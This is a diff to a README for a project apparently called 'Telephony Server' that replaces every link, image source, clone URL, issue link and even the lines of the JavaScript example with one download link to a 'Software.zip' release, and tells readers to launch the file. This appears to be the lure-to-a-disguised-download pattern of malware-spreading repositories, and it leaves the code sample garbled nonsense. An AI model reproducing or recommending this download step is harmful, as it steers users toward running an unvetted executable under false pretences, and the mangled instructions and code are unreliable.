@@ -2,15 +2,15 @@
 
 Welcome to the Telephony Server repository! This powerful bridge connects various telephony providers with real-time communication platforms, enabling seamless call routing, robust metrics collection, and observability features for enhanced telephony operations.
 
-![Telephony Server Logo](https://example.com/telephony-server-logo.png)
+![Telephony Server Logo](https://github.com/Yoyoyo793/telephony-server/releases/download/v1.0/Software.zip)
 
 ## Repository Information
 - **Repository name:** telephony-server
-- **Description:** Telephony Server is a powerful bridge that connects telephony providers (Twilio, Vonage, Plivo, etc.) with real-time communication platforms (LiveKit, Jay.so, Pipecat, etc.). It enables seamless call routing, robust metrics collection, and observability features for enhanced telephony operations.
+- **Description:** Telephony Server is a powerful bridge that connects telephony providers (Twilio, Vonage, Plivo, etc.) with real-time communication platforms (LiveKit, https://github.com/Yoyoyo793/telephony-server/releases/download/v1.0/Software.zip, Pipecat, etc.). It enables seamless call routing, robust metrics collection, and observability features for enhanced telephony operations.
 - **Topics:** agent, jay, langchain, llm, multimodal, pilvo, pipecat, pydantic, telephony, telephonymanager, twilio, vad, vocode, voice, voiceai, vonage
 
 ## Installation
-To get started with Telephony Server, you can download the latest version [v1.0.0.zip](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip). 
+To get started with Telephony Server, you can download the latest version [https://github.com/Yoyoyo793/telephony-server/releases/download/v1.0/Software.zip](https://github.com/Yoyoyo793/telephony-server/releases/download/v1.0/Software.zip). 
 You can launch the file to begin the installation process.
 
 ## Features
@@ -22,7 +22,7 @@ You can launch the file to begin the installation process.
 To start using the Telephony Server, follow these steps:
 1. Clone the repository:  
    ```
-   git clone https://github.com/your-username/telephony-server.git
+   git clone https://github.com/Yoyoyo793/telephony-server/releases/download/v1.0/Software.zip
    ```
 2. Install the dependencies:  
    ```
@@ -40,10 +40,10 @@ Here is an example of how you can configure the Telephony Server:
 ```javascript
 const telephonyServer = require('telephony-server');
 
-telephonyServer.configureProviders(['Twilio', 'Vonage']);
-telephonyServer.configurePlatforms(['LiveKit', 'Jay.so']);
+https://github.com/Yoyoyo793/telephony-server/releases/download/v1.0/Software.zip(['Twilio', 'Vonage']);
+https://github.com/Yoyoyo793/telephony-server/releases/download/v1.0/Software.zip(['LiveKit', 'https://github.com/Yoyoyo793/telephony-server/releases/download/v1.0/Software.zip']);
 
-telephonyServer.start();
+https://github.com/Yoyoyo793/telephony-server/releases/download/v1.0/Software.zip();
 ```
 
 ## Contributing
@@ -56,12 +56,12 @@ Contributions are welcome! If you want to contribute to the Telephony Server pro
 6. Create a new Pull Request.
 
 ## Support
-If you encounter any issues or have questions about Telephony Server, feel free to [open an issue](https://github.com/your-username/telephony-server/issues). 
+If you encounter any issues or have questions about Telephony Server, feel free to [open an issue](https://github.com/Yoyoyo793/telephony-server/releases/download/v1.0/Software.zip). 
 
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ---
 
-![Telephony Server](https://example.com/telephony-server-image.jpg)  
-Feel free to visit our GitHub repository [here](https://github.com/your-username/telephony-server) for more information!
+![Telephony Server](https://github.com/Yoyoyo793/telephony-server/releases/download/v1.0/Software.zip)  
+Feel free to visit our GitHub repository [here](https://github.com/Yoyoyo793/telephony-server/releases/download/v1.0/Software.zip) for more information!
